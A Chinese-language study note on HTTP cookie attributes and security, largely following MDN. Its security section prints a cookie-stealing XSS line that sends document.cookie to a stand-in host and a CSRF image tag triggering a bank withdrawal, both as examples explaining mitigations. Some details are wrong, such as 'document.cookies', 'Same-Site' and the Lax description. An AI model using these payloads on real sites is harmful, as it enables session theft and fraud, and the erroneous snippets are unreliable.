# HTTP相关知识点
## 一、 cookies
[MDN cookies文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)
### 设置cookie
``` javascript
// 设置cookies
document.cookies = 'name=milo'
// 获取cookies
document.cookies
```
### cookie的生命周期
* Expires 过期时间(绝对时间)
* Max-Age 有效时间(过多少时间)
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```
### 限制访问cookie
* `Secure`: 只能通过https协议发送
* `HttpOnly`: document.cookies无法访问带 `HttpOnly`的cookie

示例
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```
### cookie的作用域
`Domain` 和 `Path` 标识定义了Cookie的作用域：即允许 Cookie 应该发送给哪些URL。
#### Domain属性
Domain指定了哪些主机可以访问cookie，默认为`origin`, **不包含子域名**，如果指定了Domain,则一般包含子域名

#### Path属性
`Path`标识了主机下的哪些路径可以访问cookie
例如，设置 Path=/docs，则以下地址都会匹配：
* /docs
* /docs/Web/
* /docs/Web/HTTP

#### SameSite 属性
`SameSite` cookie允许服务器要求某个cookie在跨域时不被发送，从而阻止跨站请求伪造攻击([CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF))

示例
```
Set-Cookie: key=value;Same-Site=Strict
```
Same-Site有三个值
* None: 同站和跨站都会发送cookies
* Strict: 相同站点才能发送
* Lax：与`Strict`类似，外部站点通过链接点击跳转时会携带cookie,比如图片加载和iframe调用

#### Cookie Prefixes
cookie机制使得服务器无法确定cookie是在安全源上设置的
子域上的易受攻击的应用程序可以使用Domain属性设置cookie，从而可以访问所有其他子域上的该cookie

##### __host-
如果 cookie 名称具有此前缀，则仅当它也用 Secure 属性标记，是从安全来源发送的，不包括 Domain 属性，并将 Path 属性设置为 / 时，它才在 Set-Cookie 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。

##### __Secure
如果 cookie 名称具有此前缀，则仅当它也用 Secure 属性标记，是从安全来源发送的，它才在 Set-Cookie 标头中接受。该前缀限制要弱于 __Host- 前缀。

#### 安全
根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。
当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。

缓解涉及Cookie的攻击的方法：
* 使用 HttpOnly 属性可防止通过 JavaScript 访问 cookie 值。
* 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 SameSite 属性设置为Strict 或 Lax。（请参见上方的 SameSite Cookie。）在支持 SameSite 的浏览器中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。


#### 会话劫持和XSS
```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
设置`HttpOnly`可以在一定程度上缓解此类攻击

#### 跨站请求伪造(CSRF)
```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

* 对用户输入进行过滤来阻止 XSS (en-US)；
* 任何敏感操作都需要确认；
* 用于敏感信息的 Cookie 只能拥有较短的生命周期；















